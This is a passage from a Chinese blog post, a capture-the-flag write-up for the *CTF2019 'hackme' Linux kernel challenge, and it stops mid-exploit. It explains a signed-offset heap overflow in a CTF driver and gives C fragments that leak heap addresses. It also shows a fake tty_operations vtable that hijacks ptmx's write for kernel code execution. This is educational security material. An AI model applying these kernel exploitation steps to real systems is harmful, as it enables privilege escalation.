@@ -1,0 +1,338 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>*CTF2019-hackme-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="首先看一下启动参数 qemu-system-x86_64 \ -m 256M \ -nographic \ -kernel bzImage \ -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \ -monitor /dev/null \ -initrd initramfs.cpio \ -smp cores=4,threads=2 \ -cpu qemu64,smep,smap 2>/dev/null 开启了 kaslr 和 smep，smap。 这道题是一个堆上溢出造成的 UAF，"><meta property="og:image" content><meta property="og:title" content="*CTF2019-hackme-WP"><meta property="og:description" content="首先看一下启动参数 qemu-system-x86_64 \ -m 256M \ -nographic \ -kernel bzImage \ -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \ -monitor /dev/null \ -initrd initramfs.cpio \ -smp cores=4,threads=2 \ -cpu qemu64,smep,smap 2>/dev/null 开启了 kaslr 和 smep，smap。 这道题是一个堆上溢出造成的 UAF，"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1433.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-08T16:08:00+00:00"><meta property="article:modified_time" content="2021-07-08T16:08:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="*CTF2019-hackme-WP"><meta name=twitter:description content="首先看一下启动参数 qemu-system-x86_64 \ -m 256M \ -nographic \ -kernel bzImage \ -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \ -monitor /dev/null \ -initrd initramfs.cpio \ -smp cores=4,threads=2 \ -cpu qemu64,smep,smap 2>/dev/null 开启了 kaslr 和 smep，smap。 这道题是一个堆上溢出造成的 UAF，"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>*CTF2019-hackme-WP</h1><div class=meta>Posted on Jul 8, 2021</div></div><section class=body><p>首先看一下启动参数</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>qemu-system-x86_64 <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -m 256M <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -nographic <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -kernel bzImage <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -append <span style=color:#4070a0>&#39;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#39;</span> <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -monitor /dev/null <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -initrd initramfs.cpio <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -smp <span style=color:#bb60d5>cores</span><span style=color:#666>=</span>4,threads<span style=color:#666>=</span><span style=color:#40a070>2</span> <span style=color:#4070a0;font-weight:700>\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -cpu qemu64,smep,smap 2&gt;/dev/null
+</span></span></code></pre></div><p>开启了 kaslr 和 smep，smap。</p><p>这道题是一个堆上溢出造成的 UAF，具体的，在 0x30002 功能，也就是 edit 功能处</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/3828129584.png></div><p>offset 和 user_buf_len 都是有符号数，所以通过输入负数就可以实现无限的前后向溢出。由于 slab/slub 对于大多等大小的 chunk 都是连续放置的，所以通过这个溢出可以实现 UAF 等攻击。</p><p>类似于 edit 功能，通过 0x30003 号功能可以实现前后读。</p><p>内核内存分配器，slab 或 slub 都类似于 fastbin，每个 chunk 的第一个 8 字都指向下一个空闲的 chunk，所以我们可以容易地 leak 出堆块地址</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span> fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/hackme&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>2</span>, buf, <span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>3</span>, buf, <span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>    data_free(fd, <span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>    get_content(fd, <span style=color:#40a070>3</span>, buf, <span style=color:#40a070>0x100</span>, <span style=color:#666>-</span><span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>    size_t heap_addr <span style=color:#666>=</span> ((size_t<span style=color:#666>*</span> )buf)[<span style=color:#40a070>0</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x200</span>;
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] heap_addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, heap_addr);
+</span></span></code></pre></div><p>同样类似于 fastbin，由于我们可以完全控制前一个 chunk，也就是上面 poc 中的 2 号 chunk 的 next 指针，就可以做 fastbin attack，而且不需要考虑绕过乱七八糟的检测，实现任意地址读写，所以一个自然的想法是直接分配到 cred 结构体上，修改 id。但是这样需要泄露 cred 的地址，不是很好实现。所以学习到了 tty_struct attack 这种攻击方式。</p><h3 id=tty_struct-attack>tty_struct attack</h3><p>在 /dev 目录中，有一个 ptmx 设备文件，任何用户都可读写之。在 open 它的时候，内核会为它分配一个 tty_struct 结构体，特别的，这个结构体没有和 kmalloc 隔离，会复用我们释放的大小合适的 chunk，其结构在 Linux 4.20.13 下为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> {
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span>	magic;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>kref</span> kref;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>device</span> <span style=color:#666>*</span>dev;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_driver</span> <span style=color:#666>*</span>driver;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_operations</span> <span style=color:#666>*</span>ops;
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> index;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>/* Protects ldisc changes: Lock tty not pty */</span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>ld_semaphore</span> ldisc_sem;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_ldisc</span> <span style=color:#666>*</span>ldisc;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>mutex</span> atomic_write_lock;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>mutex</span> legacy_mutex;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>mutex</span> throttle_mutex;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>rw_semaphore</span> termios_rwsem;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>mutex</span> winsize_mutex;
+</span></span><span style=display:flex><span>	spinlock_t ctrl_lock;
+</span></span><span style=display:flex><span>	spinlock_t flow_lock;
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>/* Termios values are protected by the termios rwsem */</span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>ktermios</span> termios, termios_locked;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>termiox</span> <span style=color:#666>*</span>termiox;	<span style=color:#60a0b0;font-style:italic>/* May be NULL for unsupported */</span>
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span> name[<span style=color:#40a070>64</span>];
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pid</span> <span style=color:#666>*</span>pgrp;		<span style=color:#60a0b0;font-style:italic>/* Protected by ctrl lock */</span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pid</span> <span style=color:#666>*</span>session;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> flags;
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> count;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>winsize</span> winsize;		<span style=color:#60a0b0;font-style:italic>/* winsize_mutex */</span>
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> <span style=color:#002070;font-weight:700>stopped</span>:<span style=color:#40a070>1</span>,	<span style=color:#60a0b0;font-style:italic>/* flow_lock */</span>
+</span></span><span style=display:flex><span>		      <span style=color:#002070;font-weight:700>flow_stopped</span>:<span style=color:#40a070>1</span>,
+</span></span><span style=display:flex><span>		      <span style=color:#002070;font-weight:700>unused</span>:BITS_PER_LONG <span style=color:#666>-</span> <span style=color:#40a070>2</span>;
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> hw_stopped;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> <span style=color:#002070;font-weight:700>ctrl_status</span>:<span style=color:#40a070>8</span>,	<span style=color:#60a0b0;font-style:italic>/* ctrl_lock */</span>
+</span></span><span style=display:flex><span>		      <span style=color:#002070;font-weight:700>packet</span>:<span style=color:#40a070>1</span>,
+</span></span><span style=display:flex><span>		      <span style=color:#002070;font-weight:700>unused_ctrl</span>:BITS_PER_LONG <span style=color:#666>-</span> <span style=color:#40a070>9</span>;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> receive_room;	<span style=color:#60a0b0;font-style:italic>/* Bytes free for queue */</span>
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> flow_change;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>link;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>fasync_struct</span> <span style=color:#666>*</span>fasync;
+</span></span><span style=display:flex><span>	wait_queue_head_t write_wait;
+</span></span><span style=display:flex><span>	wait_queue_head_t read_wait;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>work_struct</span> hangup_work;
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> <span style=color:#666>*</span>disc_data;
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> <span style=color:#666>*</span>driver_data;
+</span></span><span style=display:flex><span>	spinlock_t files_lock;		<span style=color:#60a0b0;font-style:italic>/* protects tty_files list */</span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>list_head</span> tty_files;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020>#define N_TTY_BUF_SIZE 4096
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> closing;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>write_buf;
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> write_cnt;
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>/* If the tty has a pending do_SAK, queue it here - akpm */</span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>work_struct</span> SAK_work;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_port</span> <span style=color:#666>*</span>port;
+</span></span><span style=display:flex><span>} __randomize_layout;
+</span></span></code></pre></div><p>注意到其中的 <code>const struct tty_operations *ops;</code> ops 指针，它指向一个 tty 操作虚表，定义为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_operations</span> {
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span> (<span style=color:#666>*</span>lookup)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_driver</span> <span style=color:#666>*</span>driver,
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>file</span> <span style=color:#666>*</span>filp, <span style=color:#902000>int</span> idx);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span>  (<span style=color:#666>*</span>install)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_driver</span> <span style=color:#666>*</span>driver, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>remove)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_driver</span> <span style=color:#666>*</span>driver, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span>  (<span style=color:#666>*</span>open)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span> tty, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>file</span> <span style=color:#666>*</span> filp);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>close)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span> tty, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>file</span> <span style=color:#666>*</span> filp);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>shutdown)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>cleanup)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span>  (<span style=color:#666>*</span>write)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span> tty,
+</span></span><span style=display:flex><span>		      <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>buf, <span style=color:#902000>int</span> count);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span>  (<span style=color:#666>*</span>put_char)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty, <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> ch);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>flush_chars)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span>  (<span style=color:#666>*</span>write_room)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span>  (<span style=color:#666>*</span>chars_in_buffer)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span>  (<span style=color:#666>*</span>ioctl)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty,
+</span></span><span style=display:flex><span>		    <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> cmd, <span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> arg);
+</span></span><span style=display:flex><span>	<span style=color:#902000>long</span> (<span style=color:#666>*</span>compat_ioctl)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty,
+</span></span><span style=display:flex><span>			     <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> cmd, <span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> arg);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>set_termios)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>ktermios</span> <span style=color:#666>*</span> old);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>throttle)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span> tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>unthrottle)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span> tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>stop)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>start)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>hangup)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> (<span style=color:#666>*</span>break_ctl)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty, <span style=color:#902000>int</span> state);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>flush_buffer)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>set_ldisc)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>wait_until_sent)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty, <span style=color:#902000>int</span> timeout);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>send_xchar)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty, <span style=color:#902000>char</span> ch);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> (<span style=color:#666>*</span>tiocmget)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> (<span style=color:#666>*</span>tiocmset)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty,
+</span></span><span style=display:flex><span>			<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> set, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> clear);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> (<span style=color:#666>*</span>resize)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>winsize</span> <span style=color:#666>*</span>ws);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> (<span style=color:#666>*</span>set_termiox)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>termiox</span> <span style=color:#666>*</span>tnew);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> (<span style=color:#666>*</span>get_icount)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty,
+</span></span><span style=display:flex><span>				<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>serial_icounter_struct</span> <span style=color:#666>*</span>icount);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span>  (<span style=color:#666>*</span>get_serial)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>serial_struct</span> <span style=color:#666>*</span>p);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span>  (<span style=color:#666>*</span>set_serial)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>serial_struct</span> <span style=color:#666>*</span>p);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>show_fdinfo)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>seq_file</span> <span style=color:#666>*</span>m);
+</span></span><span style=display:flex><span><span style=color:#007020>#ifdef CONFIG_CONSOLE_POLL
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>	<span style=color:#902000>int</span> (<span style=color:#666>*</span>poll_init)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_driver</span> <span style=color:#666>*</span>driver, <span style=color:#902000>int</span> line, <span style=color:#902000>char</span> <span style=color:#666>*</span>options);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> (<span style=color:#666>*</span>poll_get_char)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_driver</span> <span style=color:#666>*</span>driver, <span style=color:#902000>int</span> line);
+</span></span><span style=display:flex><span>	<span style=color:#902000>void</span> (<span style=color:#666>*</span>poll_put_char)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_driver</span> <span style=color:#666>*</span>driver, <span style=color:#902000>int</span> line, <span style=color:#902000>char</span> ch);
+</span></span><span style=display:flex><span><span style=color:#007020>#endif
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>	<span style=color:#902000>int</span> (<span style=color:#666>*</span>proc_show)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>seq_file</span> <span style=color:#666>*</span>, <span style=color:#902000>void</span> <span style=color:#666>*</span>);
+</span></span><span style=display:flex><span>} __randomize_layout;
+</span></span></code></pre></div><p>也就是说我们对 ptmx 的所有操作都是通过这个虚表中的函数指针调用的，不难想到通过类似于 _IO_FILE 中对 vtable 的攻击来进行利用，也就是让 ptmx 的 tty_struct 使用一个我们可以控制的结构体，修改 ops 指针的值，使之指向一个我们可以控制的内核内存段（因为开启了 smep/smap，内核态不能访问用户态数据），劫持某函数指针（这里以 write 为例）就可以实现任意代码执行。两个条件都很好满足，如下。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span> fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/hackme&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>0</span>, buf, TTY_STRUCT_SIZE);
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>1</span>, buf, TTY_STRUCT_SIZE);
+</span></span><span style=display:flex><span>    data_free(fd, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>2</span>, buf, <span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>3</span>, buf, <span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>    data_free(fd, <span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>    get_content(fd, <span style=color:#40a070>3</span>, buf, <span style=color:#40a070>0x100</span>, <span style=color:#666>-</span><span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>    size_t heap_addr <span style=color:#666>=</span> ((size_t<span style=color:#666>*</span> )buf)[<span style=color:#40a070>0</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x200</span>;
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] heap_addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, heap_addr);
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> tty_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/ptmx&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    size_t fake_tty_vtable[<span style=color:#40a070>0x20</span>];
+</span></span><span style=display:flex><span>    fake_tty_vtable[<span style=color:#40a070>7</span>] <span style=color:#666>=</span> magic_gadget; <span style=color:#60a0b0;font-style:italic>// haijack write
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    data_free(fd, <span style=color:#40a070>3</span>);
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>3</span>, (<span style=color:#902000>char</span> <span style=color:#666>*</span>)fake_tty_vtable, <span style=color:#40a070>0x100</span>);
